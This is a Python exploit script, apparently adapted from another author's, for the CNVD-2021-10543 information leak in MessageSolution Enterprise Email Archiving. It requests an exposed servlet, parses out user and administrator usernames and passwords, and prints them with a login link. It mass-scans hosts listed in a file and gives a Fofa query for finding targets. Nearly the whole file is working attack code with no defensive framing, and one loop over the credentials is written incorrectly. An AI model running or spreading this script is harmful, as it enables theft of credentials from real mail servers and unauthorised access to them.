#@author Firbasky
#修改大师傅的exp
import requests
import urllib3
import time
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

"""
MessageSolution企业邮件归档管理系统 EEA是北京易讯思达科技开发有限公司开发的一款邮件归档系统。
该系统存在通用WEB信息泄漏，泄露Windows服务器administrator hash与web账号密码
影响版本
MessageSolution Enterprise Email Archiving (EEA)
"""

def title():
    print("+-------------------------------------------------+")
    print("+-----------    CNVD-2021-10543   ----------------+")
    print("+----------- MessageSolution信息泄漏 --------------+")
    print('+--------- Fofa: title="MessageSolution" ---------+')
    print("+--------  use: python3 CNVD-2021-10543.py -------+")
    print("+-------------------------------------------------+")

def POC_1(url):
    target_url = url + "/authenticationserverservlet/"
    login_url = url + "/indexcommon.jsp"
    # 信息泄露的exp
    try:
        res = requests.get(url=target_url, verify=False,timeout=10)
        if "administrator" in res.text and res.status_code == 200:
            print(f"[!] \033[31m目标系统: {url}/authenticationserverservlet/ 存在信息泄漏\033[0m")
            time.sleep(1)
            print("[!] \033[31m正在获取目标系统敏感信息.........\033[0m")
            bs_xml = BeautifulSoup(res.text,features="html.parser")
            user_names = bs_xml.findAll('username')
            passwords = bs_xml.findAll('password')
            i = 1
            print(f"[!] \033[31m获取到目标系统信息:\033[0m")
            if i < len(user_names):
                for user_name,password  in user_names,passwords:
                    print(f"   用户名: {user_name.text}    密 码: {password.text}")
                    i = i+1
            else:
                print(f"   用户名: {user_names[0].text}\n   密 码: {passwords[0].text}")
            user_name2 = bs_xml.findAll('administratorusername')
            password2 = bs_xml.findAll('administratorpassword')
            print(f"可能:用户名: {user_name2[0].text}\n   密 码: {password2[0].text}")

            print(f"\033[32m[0] 请访问: {login_url} 进行登录！\n")
        else:
            print(f"[0]  \033[32m目标系统: {url} 不存在信息泄\033[0m")
    except Exception as e:
        print(f"[!]  目标系统: {url} 出现意外错误：\n {e}")

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for target_url in scan_url:
            if target_url[:4] != "http":
                target_url = "https://" + target_url
            target_url = target_url.strip('\n')
            try:
                POC_1(target_url)
            except Exception as e:
                print("请求报错:{e}".format(e))
                continue

if __name__ == '__main__':
    title()
    Scan('IP.txt')
